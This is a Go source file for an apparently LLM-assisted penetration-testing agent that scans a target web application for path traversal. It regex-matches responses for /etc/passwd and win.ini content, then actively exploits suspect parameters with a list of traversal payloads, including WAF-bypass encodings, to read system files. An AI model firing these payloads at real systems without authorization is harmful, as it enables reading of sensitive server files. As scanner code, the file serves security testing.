package specialist

import (
	"cal-project/internal/brain/llm"
	"cal-project/internal/brain/prompts"
	"cal-project/internal/core/agent"
	"cal-project/internal/core/bus"
	"cal-project/internal/core/reporter"
	"cal-project/internal/hands/tools"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/url"
	"regexp"
	"runtime/debug"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var ptMessageCounter atomic.Uint64

// PathTraversalSpecialist is a specialist agent focused on Directory Traversal
type PathTraversalSpecialist struct {
	id       string
	bus      bus.Bus
	brain    llm.LLM
	ctx      context.Context
	target   string
	executor tools.ToolExecutor
}

// NewPathTraversalSpecialist creates a new PathTraversalSpecialist agent
func NewPathTraversalSpecialist(ctx context.Context, id string, eventBus bus.Bus, llmClient llm.LLM, target string, executor tools.ToolExecutor) *PathTraversalSpecialist {
	return &PathTraversalSpecialist{
		id:       id,
		bus:      eventBus,
		brain:    llmClient,
		ctx:      ctx,
		target:   target,
		executor: executor,
	}
}

func (p *PathTraversalSpecialist) ID() string {
	return p.id
}

func (p *PathTraversalSpecialist) Type() agent.AgentType {
	return agent.Specialist
}

func (p *PathTraversalSpecialist) Run() error {
	log.Printf("[%s] Online. Hunting for Path Traversal vulnerabilities on: %s\n", p.id, p.target)
	return nil
}

func (p *PathTraversalSpecialist) OnEvent(event bus.Event) {
	// Only process commands directed to this agent
	if event.Type == bus.Command && event.ToAgent == p.id {
		log.Printf("[%s] Received command: %v\n", p.id, event.Payload)
		go func() {
			defer func() {
				if rec := recover(); rec != nil {
					log.Printf("[%s] PANIC in executeTask: %v\n%s\n", p.id, rec, debug.Stack())
					p.reportError(event.FromAgent, fmt.Errorf("task panicked: %v", rec))
				}
			}()
			p.executeTask(event)
		}()
	}
}

// executeTask performs Path Traversal scanning
func (p *PathTraversalSpecialist) executeTask(cmdEvent bus.Event) {
	taskDesc, ok := cmdEvent.Payload.(string)
	if !ok {
		log.Printf("[%s] Invalid task payload\n", p.id)
		return
	}

	log.Printf("[%s] Executing: %s\n", p.id, taskDesc)

	if p.executor == nil {
		p.reportObservation(cmdEvent.FromAgent, "Path Traversal scan skipped (Docker executor unavailable)")
		return
	}

	// Fetch HTTP response
	targetURL := p.replaceLocalhostForDocker(p.target)

	log.Printf("[%s] Fetching HTTP response from: %s\n", p.id, targetURL)
	httpOutput, err := tools.SimpleHTTPGet(p.ctx, p.executor, targetURL)
	if err != nil {
		log.Printf("[%s] HTTP request failed: %v\n", p.id, err)
		p.reportError(cmdEvent.FromAgent, err)
		return
	}

	// Use LLM to analyze for Path Traversal signatures
	log.Printf("[%s] Analyzing for Path Traversal signatures...\n", p.id)
	analysis := p.analyzeForPathTraversal(httpOutput)

	log.Printf("[%s] Path Traversal analysis complete\n", p.id)

	// Report candidate to Reporter if found
	p.reportCandidateIfFound(analysis)

	// Generate report
	report := p.generateReport(httpOutput, analysis)

	p.reportObservation(cmdEvent.FromAgent, report)
}

func (p *PathTraversalSpecialist) replaceLocalhostForDocker(targetURL string) string {
	if strings.Contains(targetURL, "localhost") || strings.Contains(targetURL, "127.0.0.1") {
		if parsedURL, err := url.Parse(targetURL); err == nil {
			hostname := parsedURL.Hostname()
			if hostname == "localhost" || hostname == "127.0.0.1" {
				parsedURL.Host = strings.Replace(parsedURL.Host, hostname, "host.docker.internal", 1)
				return parsedURL.String()
			}
		}
	}
	return targetURL
}

func (p *PathTraversalSpecialist) analyzeForPathTraversal(httpResponse string) string {
	// OPTIMIZATION: Pattern matching first (skip LLM if clear path traversal patterns found)
	if patternResult := p.patternMatchPathTraversal(httpResponse); patternResult != "" {
		log.Printf("[%s] Pattern match found Path Traversal indicators, skipping LLM\n", p.id)
		return patternResult
	}

	// Limit response size for LLM
	responseToAnalyze := httpResponse
	if len(httpResponse) > 4000 {
		responseToAnalyze = httpResponse[:4000]
	}

	prompt := prompts.GetPathTraversalAnalysis(responseToAnalyze)

	analysis, err := p.brain.Generate(p.ctx, prompt)
	if err != nil {
		log.Printf("[%s] LLM analysis failed: %v\n", p.id, err)
		return "❌ Unable to analyze (LLM error)"
	}

	return analysis
}

// patternMatchPathTraversal performs fast pattern matching for Path Traversal indicators
func (p *PathTraversalSpecialist) patternMatchPathTraversal(httpResponse string) string {
	// File content patterns indicating successful traversal
	fileContentPatterns := []*regexp.Regexp{
		regexp.MustCompile(`root:.*:0:0:`),                        // /etc/passwd
		regexp.MustCompile(`(?i)\[boot loader\]`),                 // boot.ini
		regexp.MustCompile(`(?i)\[fonts\]`),                       // win.ini
		regexp.MustCompile(`daemon:.*:1:1:`),                      // /etc/passwd
		regexp.MustCompile(`nobody:.*:65534:`),                    // /etc/passwd
		regexp.MustCompile(`(?i)windows.*system32`),               // Windows path
		regexp.MustCompile(`(?i)c:\\windows`),                     // Windows path
		regexp.MustCompile(`/usr/sbin/nologin`),                   // /etc/passwd shell
	}

	// Error patterns indicating file inclusion attempt
	errorPatterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)failed to open stream`),           // PHP file error
		regexp.MustCompile(`(?i)include.*failed opening`),         // PHP include error
		regexp.MustCompile(`(?i)no such file or directory`),       // Linux error
		regexp.MustCompile(`(?i)permission denied`),               // Access denied
		regexp.MustCompile(`(?i)cannot find the path`),            // Windows error
	}

	// Check if sensitive file contents are already visible
	for _, pattern := range fileContentPatterns {
		if match := pattern.FindString(httpResponse); match != "" {
			// Truncate match for logging
			matchPreview := match
			if len(match) > 50 {
				matchPreview = match[:50]
			}
			log.Printf("[%s] Sensitive file content detected: %s\n", p.id, matchPreview)
			result := "VULNERABILITY CANDIDATE FOUND: Yes\n"
			result += fmt.Sprintf("- LOCATION: %s\n", p.target)
			result += "- VULNERABLE PARAMETER: file (detected from content)\n"
			result += "- CONFIDENCE: High (File content detected)\n"
			result += "- REASONING: Sensitive file content found in response\n"
			result += "- SUGGESTED PAYLOAD: ../../../etc/passwd\n"
			return result
		}
	}

	// Check for file operation errors (potential but not confirmed)
	for _, pattern := range errorPatterns {
		if match := pattern.FindString(httpResponse); match != "" {
			log.Printf("[%s] File operation error detected: %s\n", p.id, match)
			// Don't return - this indicates file param exists but needs testing
		}
	}

	// Check for file-related parameters in forms/links
	fileParamPatterns := []*regexp.Regexp{
		regexp.MustCompile(`name=["']?(file|path|doc|document|page|include|src|source|filename|filepath)["']?`),
		regexp.MustCompile(`\?(file|path|doc|document|page|include|src|source|filename|filepath)=`),
	}

	for _, pattern := range fileParamPatterns {
		if match := pattern.FindStringSubmatch(httpResponse); len(match) > 0 {
			paramName := "file"
			if len(match) > 1 {
				paramName = match[1]
			}
			result := "VULNERABILITY CANDIDATE FOUND: Yes\n"
			result += fmt.Sprintf("- LOCATION: %s\n", p.target)
			result += fmt.Sprintf("- VULNERABLE PARAMETER: %s\n", paramName)
			result += "- CONFIDENCE: Medium (Pattern-based detection)\n"
			result += "- REASONING: File-related parameter detected\n"
			result += "- SUGGESTED PAYLOAD: ../../../etc/passwd\n"
			return result
		}
	}

	return "" // Fallback to LLM
}

func (p *PathTraversalSpecialist) generateReport(httpResponse string, analysis string) string {
	report := "=== PATH TRAVERSAL SCAN REPORT ===\n\n"
	report += fmt.Sprintf("Target: %s\n\n", p.target)

	report += "\n--- Path Traversal Vulnerability Analysis ---\n"
	report += analysis + "\n"

	return report
}

// reportCandidateIfFound parses LLM analysis and reports vulnerability candidate to Reporter
func (p *PathTraversalSpecialist) reportCandidateIfFound(analysis string) {
	// Check if vulnerability was found
	if !strings.Contains(analysis, "VULNERABILITY CANDIDATE FOUND: Yes") {
		return
	}

	// Extract details from the analysis
	var location, parameter, reasoning string

	lines := strings.Split(analysis, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "- LOCATION:") {
			location = strings.TrimSpace(strings.TrimPrefix(line, "- LOCATION:"))
		} else if strings.HasPrefix(line, "- VULNERABLE PARAMETER:") {
			parameter = strings.TrimSpace(strings.TrimPrefix(line, "- VULNERABLE PARAMETER:"))
		} else if strings.HasPrefix(line, "- REASONING:") {
			reasoning = strings.TrimSpace(strings.TrimPrefix(line, "- REASONING:"))
		}
	}

	// Build full URL if location is relative
	fullURL := p.target
	if location != "" && !strings.HasPrefix(location, "http") {
		if strings.HasPrefix(location, "/") {
			// Parse base URL
			if parsedURL, err := url.Parse(p.target); err == nil {
				fullURL = fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, location)
			}
		}
	} else if location != "" {
		fullURL = location
	}

	// Attempt exploitation before reporting
	if parameter != "" && fullURL != "" {
		log.Printf("[%s] Attempting Path Traversal exploitation on parameter: %s\n", p.id, parameter)
		if success, evidence := p.exploitPathTraversal(fullURL, parameter); success {
			// Exploitation successful - report as Finding (verified)
			p.reportFinding(fullURL, parameter, evidence)
			return
		}
	}

	// Exploitation failed - report as Candidate (unverified)
	candidate := reporter.VulnerabilityCandidate{
		Type:      "PathTraversal",
		URL:       fullURL,
		Parameter: parameter,
		Evidence:  analysis,
		Reasoning: reasoning,
		Timestamp: time.Now().Format(time.RFC1123),
		Status:    "pending",
	}

	// Send to Reporter
	candidateJSON, _ := json.Marshal(candidate)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-candidate-%d", p.id, ptMessageCounter.Add(1)),
		FromAgent: p.id,
		ToAgent:   "Reporter-01",
		Type:      bus.Candidate,
		Payload:   string(candidateJSON),
	}
	p.bus.Publish("Reporter-01", event)
}

// PTResult holds the result of a single path traversal payload test
type PTResult struct {
	Payload   string
	Platform  string
	Signature string
	Success   bool
}

// exploitPathTraversal attempts to exploit Path Traversal by reading sensitive files (PARALLEL)
func (p *PathTraversalSpecialist) exploitPathTraversal(targetURL, parameter string) (bool, string) {
	// Common path traversal payloads with target files
	type payloadTest struct {
		payload   string
		signature string // Expected content in response
		platform  string // Target platform
	}

	tests := []payloadTest{
		// Linux/Unix (most common first)
		{"../../../etc/passwd", "root:", "Linux"},
		{"../../../../etc/passwd", "root:", "Linux"},
		{"../../../../../etc/passwd", "root:", "Linux"},

		// Windows
		{"../../../windows/win.ini", "[fonts]", "Windows"},
		{"..\\..\\..\\windows\\win.ini", "[fonts]", "Windows"},

		// Alternative encodings
		{"..%2f..%2f..%2fetc%2fpasswd", "root:", "Linux"},

		// WAF bypass - Double URL encoding
		{"..%252f..%252f..%252fetc%252fpasswd", "root:", "Linux"},

		// WAF bypass - Double slash
		{"....//....//....//etc/passwd", "root:", "Linux"},

		// WAF bypass - Semicolon
		{"..;/..;/..;/etc/passwd", "root:", "Linux"},

		// WAF bypass - Backslash variation (Windows)
		{"..\\..\\..\\windows\\system.ini", "[drivers]", "Windows"},
	}

	// Parallel testing
	results := make(chan PTResult, len(tests))
	var wg sync.WaitGroup

	for _, test := range tests {
		wg.Add(1)
		go func(t payloadTest) {
			defer wg.Done()
			success := p.testSinglePTPayload(targetURL, parameter, t.payload, t.signature)
			results <- PTResult{
				Payload:   t.payload,
				Platform:  t.platform,
				Signature: t.signature,
				Success:   success,
			}
		}(test)
	}

	// Close results channel when all goroutines complete
	go func() {
		wg.Wait()
		close(results)
	}()

	// Check results - return on first success
	for result := range results {
		if result.Success {
			evidence := fmt.Sprintf("Path Traversal verified on %s system. Payload: %s, Signature found: %s",
				result.Platform, result.Payload, result.Signature)
			log.Printf("[%s] ✅ PATH TRAVERSAL VERIFIED: %s\n", p.id, evidence)
			return true, evidence
		}
	}

	log.Printf("[%s] ❌ Path Traversal exploitation failed: No sensitive file content detected\n", p.id)
	return false, ""
}

// testSinglePTPayload tests a single path traversal payload
func (p *PathTraversalSpecialist) testSinglePTPayload(targetURL, parameter, payload, signature string) bool {
	// Construct test URL with payload
	testURL, err := p.injectPayload(targetURL, parameter, payload)
	if err != nil {
		log.Printf("[%s] Failed to construct test URL: %v\n", p.id, err)
		return false
	}

	// Replace localhost for Docker
	dockerURL := p.replaceLocalhostForDocker(testURL)

	// Send HTTP request
	response, err := tools.SimpleHTTPGet(p.ctx, p.executor, dockerURL)
	if err != nil {
		log.Printf("[%s] HTTP request failed for payload test: %v\n", p.id, err)
		return false
	}

	// Check if signature is present in response
	return strings.Contains(response, signature)
}

// injectPayload injects the path traversal payload into the target URL parameter
func (p *PathTraversalSpecialist) injectPayload(targetURL, parameter, payload string) (string, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return "", err
	}

	// Get existing query parameters
	query := parsedURL.Query()

	// Set the parameter with payload
	query.Set(parameter, payload)

	parsedURL.RawQuery = query.Encode()
	return parsedURL.String(), nil
}

// reportFinding reports a verified Path Traversal vulnerability
func (p *PathTraversalSpecialist) reportFinding(targetURL, parameter, evidence string) {
	finding := reporter.VulnerabilityFinding{
		Type:        "PathTraversal",
		Severity:    "Critical",
		URL:         targetURL,
		Payload:     parameter,
		Description: fmt.Sprintf("Path Traversal vulnerability verified on parameter '%s'. %s. Recommendation: Implement strict input validation, use whitelists for allowed paths, and avoid direct file system access with user input.", parameter, evidence),
		Timestamp:   time.Now().Format(time.RFC1123),
	}

	findingJSON, _ := json.Marshal(finding)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-finding-%d", p.id, ptMessageCounter.Add(1)),
		FromAgent: p.id,
		ToAgent:   "Reporter-01",
		Type:      bus.Finding,
		Payload:   string(findingJSON),
	}
	p.bus.Publish("Reporter-01", event)
	log.Printf("[%s] 🎯 Reported verified Path Traversal finding: %s (param: %s)\n", p.id, targetURL, parameter)
}

func (p *PathTraversalSpecialist) reportObservation(toAgent string, observation string) {
	msgID := ptMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-obs-%d", p.id, msgID),
		FromAgent: p.id,
		ToAgent:   toAgent,
		Type:      bus.Observation,
		Payload:   observation,
	}
	p.bus.Publish(toAgent, event)
}

func (p *PathTraversalSpecialist) reportError(toAgent string, err error) {
	msgID := ptMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-err-%d", p.id, msgID),
		FromAgent: p.id,
		ToAgent:   toAgent,
		Type:      bus.Error,
		Payload:   err.Error(),
	}
	p.bus.Publish(toAgent, event)
}
